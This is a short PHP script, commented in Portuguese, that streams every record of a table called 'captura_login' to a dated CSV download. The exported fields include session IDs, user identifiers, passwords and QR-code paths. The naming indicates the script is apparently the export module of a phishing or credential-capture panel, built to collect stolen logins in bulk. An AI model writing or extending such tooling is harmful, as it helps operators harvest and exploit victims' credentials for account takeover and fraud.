<?php
require 'db.php'; // Inclui a conexão com o banco

// Define os headers para forçar o download do arquivo
$filename = "capturas_" . date('Y-m-d') . ".csv";
header('Content-Type: text/csv; charset=utf-8');
header('Content-Disposition: attachment; filename="' . $filename . '"');

// Cria um "ponteiro" para o output do PHP, que será o arquivo baixado
$output = fopen('php://output', 'w');

// Adiciona o cabeçalho (títulos das colunas) ao CSV
// Baseado na sua tabela: id, session_id, identificador, senha, qrcode_path, status, data_criacao
fputcsv($output, ['ID', 'Session ID', 'Identificador', 'Senha', 'QR Code Path', 'Status', 'Data de Criacao']);

try {
    // Busca todos os registros da tabela, ordenados do mais recente para o mais antigo
    $stmt = $pdo->query("SELECT id, session_id, identificador, senha, qrcode_path, status, data_criacao FROM captura_login ORDER BY id DESC");

    // Itera sobre cada registro e o escreve como uma linha no CSV
    while ($row = $stmt->fetch(PDO::FETCH_ASSOC)) {
        fputcsv($output, $row);
    }
} catch (PDOException $e) {
    // Se houver um erro, você pode logar, mas não deve enviar output aqui
    // para não corromper o arquivo CSV.
    die("Erro ao acessar o banco de dados: " . $e->getMessage());
}

// Fecha o ponteiro do arquivo
fclose($output);
exit;
?>